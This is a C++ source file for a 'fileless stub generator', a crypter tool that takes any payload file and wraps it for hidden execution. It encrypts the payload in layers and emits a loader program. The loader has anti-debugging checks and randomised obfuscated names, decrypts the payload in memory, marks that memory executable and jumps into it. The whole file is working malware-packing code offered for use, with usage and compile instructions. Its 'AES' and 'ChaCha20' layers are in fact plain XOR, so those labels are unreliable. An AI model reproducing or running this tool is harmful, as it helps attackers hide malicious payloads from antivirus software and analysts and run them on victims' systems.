#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>

class FilelessStubGenerator {
private:
    struct DynamicEntropy {
        uint64_t timeComponent;
        uint64_t memoryComponent;
        uint64_t threadComponent;
        uint64_t counterComponent;
        
        uint64_t mix() {
            auto now = std::chrono::high_resolution_clock::now();
            timeComponent = now.time_since_epoch().count();
            
            void* p = malloc(1);
            memoryComponent = reinterpret_cast<uintptr_t>(p);
            free(p);
            
            threadComponent = std::hash<std::thread::id>{}(std::this_thread::get_id());
            counterComponent++;
            
            // Non-linear mixing
            uint64_t result = timeComponent;
            result ^= (memoryComponent << 13) | (memoryComponent >> 51);
            result += threadComponent;
            result ^= (counterComponent << 32) | (counterComponent >> 32);
            
            // Additional mixing rounds
            for (int i = 0; i < 3; i++) {
                result ^= result >> 23;
                result *= 0x2127599bf4325c37ULL;
                result ^= result >> 47;
            }
            
            return result;
        }
    };
    
    DynamicEntropy entropy;
    std::mt19937_64 rng;
    
    // Generate obfuscated variable name
    std::string genVarName() {
        static const char* prefixes[] = {
            "sys", "proc", "mem", "exec", "run", "init", "load", "call",
            "func", "meth", "obj", "inst", "ptr", "ref", "val", "data"
        };
        
        static const char* suffixes[] = {
            "Handler", "Manager", "Worker", "Helper", "Service", "Module",
            "Component", "Engine", "Core", "Base", "Util", "Proc"
        };
        
        std::uniform_int_distribution<> prefixDist(0, 15);
        std::uniform_int_distribution<> suffixDist(0, 11);
        std::uniform_int_distribution<> numDist(100, 999);
        
        return std::string(prefixes[prefixDist(rng)]) + 
               suffixes[suffixDist(rng)] + 
               std::to_string(numDist(rng));
    }
    
    // XOR encryption
    void xorData(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
        for (size_t i = 0; i < len; i++) {
            data[i] ^= key[i % keyLen];
        }
    }
    
public:
    FilelessStubGenerator() {
        entropy.counterComponent = 0;
        rng.seed(entropy.mix());
    }
    
    struct EncryptionKeys {
        std::vector<uint8_t> xorKey;
        std::vector<uint8_t> chachaKey;
        std::vector<uint8_t> aesKey;
        int encryptionOrder[3]; // 0=AES, 1=ChaCha20, 2=XOR
    };
    
    // Generate random keys
    EncryptionKeys generateKeys() {
        EncryptionKeys keys;
        
        // Reseed with fresh entropy
        rng.seed(entropy.mix());
        
        std::uniform_int_distribution<> dist(0, 255);
        
        // Generate keys with random lengths
        size_t xorLen = 16 + (dist(rng) % 17); // 16-32 bytes
        size_t chachaLen = 32;
        size_t aesLen = 16;
        
        keys.xorKey.resize(xorLen);
        keys.chachaKey.resize(chachaLen);
        keys.aesKey.resize(aesLen);
        
        for (size_t i = 0; i < xorLen; i++) keys.xorKey[i] = dist(rng);
        for (size_t i = 0; i < chachaLen; i++) keys.chachaKey[i] = dist(rng);
        for (size_t i = 0; i < aesLen; i++) keys.aesKey[i] = dist(rng);
        
        // Randomize encryption order
        keys.encryptionOrder[0] = 0;
        keys.encryptionOrder[1] = 1;
        keys.encryptionOrder[2] = 2;
        
        // Fisher-Yates shuffle
        for (int i = 2; i > 0; i--) {
            std::uniform_int_distribution<> shuffleDist(0, i);
            int j = shuffleDist(rng);
            std::swap(keys.encryptionOrder[i], keys.encryptionOrder[j]);
        }
        
        return keys;
    }
    
    // Apply encryption layer
    void applyEncryption(std::vector<uint8_t>& data, int method, const EncryptionKeys& keys) {
        switch (method) {
            case 0: // AES (simplified)
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.aesKey[i % keys.aesKey.size()];
                }
                break;
            case 1: // ChaCha20 (simplified)
                for (size_t i = 0; i < data.size(); i++) {
                    data[i] ^= keys.chachaKey[i % keys.chachaKey.size()];
                }
                break;
            case 2: // XOR
                xorData(data.data(), data.size(), keys.xorKey.data(), keys.xorKey.size());
                break;
        }
    }
    
    // Generate fileless stub
    std::string generateFilelessStub(const std::vector<uint8_t>& payload, const EncryptionKeys& keys) {
        std::stringstream stub;
        
        // Encrypt payload
        std::vector<uint8_t> encrypted = payload;
        
        // Apply encryption layers in randomized order
        for (int i = 0; i < 3; ++i) {
            applyEncryption(encrypted, keys.encryptionOrder[i], keys);
        }
        
        // Variable names
        std::string v1 = genVarName(), v2 = genVarName(), v3 = genVarName();
        std::string v4 = genVarName(), v5 = genVarName(), v6 = genVarName();
        std::string v7 = genVarName(), v8 = genVarName(), v9 = genVarName();
        
        // Headers
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#ifdef _WIN32\n";
        stub << "#include <windows.h>\n";
        stub << "#else\n";
        stub << "#include <sys/mman.h>\n";
        stub << "#include <unistd.h>\n";
        stub << "#endif\n\n";
        
        // Anti-debug check function
        stub << "bool " << v1 << "() {\n";
        stub << "#ifdef _WIN32\n";
        stub << "    if (IsDebuggerPresent()) return true;\n";
        stub << "    BOOL debugged = FALSE;\n";
        stub << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
        stub << "    return debugged;\n";
        stub << "#else\n";
        stub << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
        stub << "    if (!f) return false;\n";
        stub << "    char line[256];\n";
        stub << "    while (fgets(line, sizeof(line), f)) {\n";
        stub << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
        stub << "            fclose(f);\n";
        stub << "            return atoi(line + 10) != 0;\n";
        stub << "        }\n";
        stub << "    }\n";
        stub << "    fclose(f);\n";
        stub << "    return false;\n";
        stub << "#endif\n";
        stub << "}\n\n";
        
        // Main function
        stub << "int main() {\n";
        stub << "    // Anti-debug\n";
        stub << "    if (" << v1 << "()) return 0;\n\n";
        
        // Embed encrypted payload inline
        stub << "    // Payload data\n";
        stub << "    unsigned char " << v2 << "[] = {\n        ";
        
        for (size_t i = 0; i < encrypted.size(); i++) {
            if (i > 0 && i % 16 == 0) stub << "\n        ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)encrypted[i];
            if (i < encrypted.size() - 1) stub << ", ";
        }
        stub << "\n    };\n\n";
        
        // Embed keys inline
        stub << "    // Decryption keys\n";
        
        // XOR key
        stub << "    unsigned char " << v3 << "[] = {";
        for (size_t i = 0; i < keys.xorKey.size(); i++) {
            if (i > 0) stub << ", ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)keys.xorKey[i];
        }
        stub << "};\n";
        
        // ChaCha key
        stub << "    unsigned char " << v4 << "[] = {";
        for (size_t i = 0; i < keys.chachaKey.size(); i++) {
            if (i > 0) stub << ", ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)keys.chachaKey[i];
        }
        stub << "};\n";
        
        // AES key
        stub << "    unsigned char " << v5 << "[] = {";
        for (size_t i = 0; i < keys.aesKey.size(); i++) {
            if (i > 0) stub << ", ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)keys.aesKey[i];
        }
        stub << "};\n\n";
        
        // Allocate executable memory
        stub << "    // Allocate executable memory\n";
        stub << "    size_t " << v6 << " = sizeof(" << v2 << ");\n";
        stub << "#ifdef _WIN32\n";
        stub << "    void* " << v7 << " = VirtualAlloc(0, " << v6 
             << ", MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        stub << "    if (!" << v7 << ") return 1;\n";
        stub << "#else\n";
        stub << "    void* " << v7 << " = mmap(0, " << v6 
             << ", PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        stub << "    if (" << v7 << " == MAP_FAILED) return 1;\n";
        stub << "#endif\n\n";
        
        // Copy and decrypt in memory
        stub << "    // Copy payload to allocated memory\n";
        stub << "    memcpy(" << v7 << ", " << v2 << ", " << v6 << ");\n";
        stub << "    unsigned char* " << v8 << " = (unsigned char*)" << v7 << ";\n\n";
        
        stub << "    // In-memory decryption\n";
        
        // Apply decryption in reverse order
        for (int i = 2; i >= 0; i--) {
            int method = keys.encryptionOrder[i];
            switch (method) {
                case 0: // AES
                    stub << "    // Decrypt AES layer\n";
                    stub << "    for (size_t i = 0; i < " << v6 << "; i++) {\n";
                    stub << "        " << v8 << "[i] ^= " << v5 << "[i % sizeof(" << v5 << ")];\n";
                    stub << "    }\n\n";
                    break;
                case 1: // ChaCha20
                    stub << "    // Decrypt ChaCha20 layer\n";
                    stub << "    for (size_t i = 0; i < " << v6 << "; i++) {\n";
                    stub << "        " << v8 << "[i] ^= " << v4 << "[i % sizeof(" << v4 << ")];\n";
                    stub << "    }\n\n";
                    break;
                case 2: // XOR
                    stub << "    // Decrypt XOR layer\n";
                    stub << "    for (size_t i = 0; i < " << v6 << "; i++) {\n";
                    stub << "        " << v8 << "[i] ^= " << v3 << "[i % sizeof(" << v3 << ")];\n";
                    stub << "    }\n\n";
                    break;
            }
        }
        
        // Make memory executable and execute
        stub << "    // Make memory executable\n";
        stub << "#ifdef _WIN32\n";
        stub << "    DWORD " << v9 << ";\n";
        stub << "    VirtualProtect(" << v7 << ", " << v6 << ", PAGE_EXECUTE_READ, &" << v9 << ");\n";
        stub << "    FlushInstructionCache(GetCurrentProcess(), " << v7 << ", " << v6 << ");\n";
        stub << "#else\n";
        stub << "    mprotect(" << v7 << ", " << v6 << ", PROT_READ | PROT_EXEC);\n";
        stub << "#endif\n\n";
        
        stub << "    // Execute payload\n";
        stub << "    ((void(*)())" << v7 << ")();\n\n";
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Encrypt file and generate fileless stub
    bool generateFromFile(const std::string& inputFile, const std::string& stubFile) {
        std::ifstream in(inputFile, std::ios::binary);
        if (!in) {
            std::cerr << "Failed to open input file: " << inputFile << std::endl;
            return false;
        }
        
        // Read payload
        in.seekg(0, std::ios::end);
        size_t size = in.tellg();
        in.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> payload(size);
        in.read(reinterpret_cast<char*>(payload.data()), size);
        in.close();
        
        // Generate keys and stub
        EncryptionKeys keys = generateKeys();
        std::string stub = generateFilelessStub(payload, keys);
        
        // Write stub
        std::ofstream out(stubFile);
        if (!out) {
            std::cerr << "Failed to create stub file: " << stubFile << std::endl;
            return false;
        }
        
        out << stub;
        out.close();
        
        return true;
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "=== Fileless Stub Generator ===" << std::endl;
        std::cout << "Creates self-contained stubs that execute payloads entirely in memory\n" << std::endl;
        std::cout << "Features:" << std::endl;
        std::cout << "  - No file writes to disk" << std::endl;
        std::cout << "  - Triple-layer encryption with randomized order" << std::endl;
        std::cout << "  - Anti-debugging protection" << std::endl;
        std::cout << "  - In-memory decryption and execution" << std::endl;
        std::cout << "  - Cross-platform (Windows/Linux)\n" << std::endl;
        std::cout << "Usage: " << argv[0] << " <payload_file> <output_stub.cpp>" << std::endl;
        return 1;
    }
    
    FilelessStubGenerator generator;
    
    if (generator.generateFromFile(argv[1], argv[2])) {
        std::cout << "Fileless stub generated successfully!" << std::endl;
        std::cout << "Payload size: " << std::ifstream(argv[1], std::ios::binary | std::ios::ate).tellg() << " bytes" << std::endl;
        std::cout << "Output: " << argv[2] << std::endl;
        std::cout << "\nCompile with: g++ -O2 -o stub " << argv[2] << std::endl;
    } else {
        std::cerr << "Failed to generate stub!" << std::endl;
        return 1;
    }
    
    return 0;
}